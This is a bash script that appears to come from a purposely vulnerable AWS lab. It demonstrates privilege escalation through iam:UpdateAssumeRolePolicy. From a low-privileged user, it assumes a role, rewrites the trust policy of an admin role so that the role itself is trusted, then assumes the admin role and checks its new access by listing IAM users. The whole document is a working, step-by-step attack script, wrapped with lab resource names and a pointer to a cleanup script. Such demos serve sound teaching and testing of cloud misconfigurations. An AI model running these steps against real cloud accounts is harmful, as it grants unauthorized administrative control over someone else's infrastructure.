#!/bin/bash

# Demo script for iam:UpdateAssumeRolePolicy privilege escalation
# This script demonstrates how a role with UpdateAssumeRolePolicy permission can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
STARTING_USER="pl-pathfinder-starting-user-prod"
PRIVESC_ROLE="pl-prod-one-hop-updateassumerolepolicy-role"
ADMIN_ROLE="pl-prod-one-hop-updateassumerolepolicy-admin-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM UpdateAssumeRolePolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Verify starting user identity
echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 2: Get account ID
echo -e "${YELLOW}Step 2: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 3: Assume the privilege escalation role
echo -e "${YELLOW}Step 3: Assuming role $PRIVESC_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-attack-session \
    --profile $PROFILE \
    --output json)

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')

# Verify role assumption
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ROLE_IDENTITY"

if [[ ! $ROLE_IDENTITY == *"$PRIVESC_ROLE"* ]]; then
    echo -e "${RED}Error: Failed to assume $PRIVESC_ROLE${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Successfully assumed $PRIVESC_ROLE${NC}\n"

# Step 4: Check current trust policy of admin role
echo -e "${YELLOW}Step 4: Checking current trust policy of admin role${NC}"
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin role ARN: $ADMIN_ROLE_ARN"

CURRENT_TRUST_POLICY=$(aws iam get-role --role-name $ADMIN_ROLE --query 'Role.AssumeRolePolicyDocument' --output json)
echo "Current trust policy:"
echo $CURRENT_TRUST_POLICY | jq '.'

# Try to assume the admin role (should fail)
echo -e "\n${YELLOW}Attempting to assume admin role (should fail)...${NC}"
if aws sts assume-role --role-arn $ADMIN_ROLE_ARN --role-session-name test-session &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly able to assume admin role already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot assume admin role (as expected)${NC}"
fi
echo ""

# Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 6: Update the trust policy to allow our role to assume it
echo -e "${YELLOW}Step 6: Updating trust policy to grant ourselves access${NC}"
NEW_TRUST_POLICY=$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
)

echo "New trust policy to be applied:"
echo "$NEW_TRUST_POLICY" | jq '.'

# Save original trust policy for cleanup
echo "$CURRENT_TRUST_POLICY" > /tmp/original_trust_policy.json

# Update the trust policy
aws iam update-assume-role-policy \
    --role-name $ADMIN_ROLE \
    --policy-document "$NEW_TRUST_POLICY"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully updated trust policy of admin role${NC}\n"
else
    echo -e "${RED}Failed to update trust policy${NC}"
    exit 1
fi

# Step 7: Assume the admin role
echo -e "${YELLOW}Step 7: Assuming the admin role${NC}"
ADMIN_CREDENTIALS=$(aws sts assume-role \
    --role-arn $ADMIN_ROLE_ARN \
    --role-session-name admin-session \
    --output json)

# Extract admin credentials
export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDENTIALS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDENTIALS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDENTIALS | jq -r '.Credentials.SessionToken')

# Verify admin role assumption
ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

if [[ ! $ADMIN_IDENTITY == *"$ADMIN_ROLE"* ]]; then
    echo -e "${RED}Error: Failed to assume admin role${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Successfully assumed admin role!${NC}\n"

# Step 8: Verify admin access
echo -e "${YELLOW}Step 8: Verifying administrative access${NC}"
echo "Testing admin permissions by listing IAM users..."

# List IAM users (admin permission)
if aws iam list-users --max-items 3 --output table; then
    echo -e "\n${GREEN}✓ Successfully listed IAM users - we have admin access!${NC}"
else
    echo -e "${RED}Failed to list users${NC}"
    exit 1
fi

# Additional admin verification
echo -e "\n${YELLOW}Additional verification - checking attached policies:${NC}"
aws iam list-attached-role-policies --role-name $ADMIN_ROLE --output table

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Summary:${NC}"
echo "1. Started as: $STARTING_USER"
echo "2. Assumed role: $PRIVESC_ROLE (with UpdateAssumeRolePolicy permission)"
echo "3. Modified trust policy of: $ADMIN_ROLE"
echo "4. Assumed admin role and gained full administrative access"

echo -e "\n${YELLOW}Attack artifacts:${NC}"
echo "- Modified trust policy of $ADMIN_ROLE"
echo "- Original trust policy saved to: /tmp/original_trust_policy.json"

echo -e "\n${RED}⚠ Warning: The admin role's trust policy has been modified!${NC}"
echo "Run ./cleanup_attack.sh to restore the original trust policy"